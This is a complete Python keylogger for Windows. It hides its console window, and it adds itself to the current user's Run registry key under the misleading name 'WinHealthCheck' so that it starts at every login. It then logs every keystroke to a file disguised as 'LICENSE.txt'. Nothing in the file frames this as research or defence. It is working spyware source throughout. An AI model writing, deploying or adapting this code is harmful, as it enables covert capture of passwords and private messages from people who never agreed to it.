from winreg import *
from pynput.keyboard import Key, Listener
import logging
import os, sys

def checkval(keyVal, Valname):
    try:
        value, _ = QueryValueEx(keyVal, Valname)
    except Exception as e:
        return False
    return True

def addStartup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]

    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    if not checkval(keyVal, 'WinHealthCheck'):
        SetValueEx(key2change, 'WinHealthCheck', 0, REG_SZ, new_file_path)

def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

log_dir = ""
Hide()
addStartup()
logging.basicConfig(filename=(log_dir + "LICENSE.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
